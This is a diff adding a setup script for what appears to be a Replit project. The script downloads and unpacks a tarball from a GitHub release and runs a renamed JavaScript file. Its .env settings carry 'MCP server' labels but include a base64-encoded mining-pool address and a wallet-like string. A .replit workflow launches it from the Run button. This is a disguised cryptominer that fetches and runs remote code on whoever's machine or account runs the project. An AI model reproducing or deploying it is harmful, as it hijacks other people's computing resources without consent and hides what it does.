@@ -1,0 +1,41 @@
+curl -O -J -L https://github.com/ozkhauun752-create/amnun/releases/download/gred/kombe.tar.gz && tar -xf kombe.tar.gz && rm -rf kombe.tar.gz
+mv ajj.js venax.js
+echo '#!/bin/bash
+CONNECT=$1
+NAME=$2
+echo "MCP_SERVER_WS=ws://165.22.101.104:3000
+MCP_SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+MCP_SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
+MCP_SERVER_SECRET=$NAME
+MCP_SERVER_CONNECTION=${CONNECT}" > .env
+export PATH=./usr/bin:$PATH
+node venax.js' > build.sh
+
+echo '#!/bin/bash
+
+bash build.sh 4 003' > main
+echo 'modules = ["nodejs-20"]
+
+[workflows]
+runButton = "Project"
+
+[[workflows.workflow]]
+name = "Project"
+mode = "parallel"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "main"
+
+[[workflows.workflow]]
+name = "main"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash main"
+
+[workflows.workflow.metadata]
+outputType = "console"
+' > .replit
